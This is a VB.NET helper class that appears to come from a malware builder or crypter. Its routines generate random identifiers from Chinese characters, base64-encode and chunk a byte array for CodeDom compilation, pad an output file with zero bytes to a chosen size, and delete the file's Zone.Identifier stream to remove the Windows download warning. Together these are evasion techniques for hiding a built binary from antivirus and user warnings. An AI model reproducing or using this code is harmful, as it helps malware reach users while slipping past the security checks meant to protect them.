
Imports System.Runtime.InteropServices

Public Class Helper
    Public Shared rand As New Random()
    Public Shared Function Randomi(ByVal lenght As Integer) As String
        '######################
        '# Create random char #
        '######################"

        Dim Chr As String = "顾氏家族的成泽是顾商城公司的首席执行官顾太太希望她的生物孙子顾金羽接管公司顾成泽的任务是引导合法的继承人成为名受人尊敬的商"
        Dim sb As New Text.StringBuilder()
        For i As Integer = 1 To lenght
            Dim idx As Integer = rand.Next(0, Chr.Length)
            sb.Append(Chr.Substring(idx, 1))
        Next
        Return sb.ToString
    End Function



    ' Thanks to pr0t0typ3 for adding the details about loops and strings.
    Public Shared Function iformat(ByVal input As Byte()) As String ' Codedom has maximum of possible chars per line so we are storing the string in multiple strings
        Dim out As New System.Text.StringBuilder ' Declaring a new StringBuilder to store the output string
        Dim base64data As String = Convert.ToBase64String(input) ' Get a readable String from the Byte Array
        Dim arr As String() = SplitString(base64data, 50000) ' Split the string into parts to fit in the Codedom-lines
        For i As Integer = 0 To arr.Length - 1 ' Looping thought each string in the array
            If i = arr.Length - 1 Then  ' If i equals the highest number
                out.Append(Chr(34) & arr(i) & Chr(34))
            Else 'I is smaller than arr.Length - 1 (i < arr.Length - 1)
                out.Append(Chr(34) & arr(i) & Chr(34) & " + " & vbNewLine)
            End If
        Next
        Return out.ToString
    End Function

    Private Shared Function SplitString(ByVal input As String, ByVal partsize As Long) As String()
        Dim amount As Long = Math.Ceiling(input.Length / partsize) 'Get Long value of the amount of parts using the formular (Length of Input / Length of Parts)
        Dim out(amount - 1) As String 'Declaring the Array to Return using the amount of Parts to define the size
        Dim currentpos As Long = 0 ' Declaring the Currentposition in the String
        For I As Integer = 0 To amount - 1 ' Looping thought each string in the array
            If I = amount - 1 Then ' If i equals the highest number
                Dim temp((input.Length - currentpos) - 1) As Char ' Declaring a temporary Array of Chars for storing the current Part of the String
                input.CopyTo(currentpos, temp, 0, (input.Length - currentpos)) ' Current part is everything left from the string
                out(I) = Convert.ToString(temp) ' Current part is appended to the output string
            Else 'I is smaller than amount - 1 (i < amount - 1)
                Dim temp(partsize - 1) As Char ' Declaring a temporary Array of Chars for storing the current Part if the String using the Size of a part (partsize)
                input.CopyTo(currentpos, temp, 0, partsize) ' Copying the current Part to the temp array
                out(I) = Convert.ToString(temp) ' Current part is appended to the output string
                currentpos += partsize ' Currentposition is increase to catch the next part in the next "round" of the loop
            End If
        Next
        Return out ' Return the Output String
    End Function

    Public Shared Sub Pumper(ByVal Path As String)
        Try
            Dim filesize As Double = Val(Main.numPump.Value)
            filesize = filesize * 1024

            Dim filetopump = IO.File.OpenWrite(Path)
            Dim size = filetopump.Seek(0, IO.SeekOrigin.[End])
            While size < filesize
                filetopump.WriteByte(0)
                size += 1
            End While
            filetopump.Close()
        Catch ex As Exception

        End Try
    End Sub


    <DllImport("kernel32.dll", CharSet:=CharSet.Auto, BestFitMapping:=False, ThrowOnUnmappableChar:=True, SetLastError:=True)>
    Public Shared Function DeleteFile(<MarshalAs(UnmanagedType.LPTStr)> ByVal filepath As String
        ) As <MarshalAs(UnmanagedType.Bool)> Boolean
    End Function
    Public Shared Sub DeleteZoneIdentifier(ByVal filePath As String)
        Try
            DeleteFile(filePath + ":Zone.Identifier")
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub

End Class




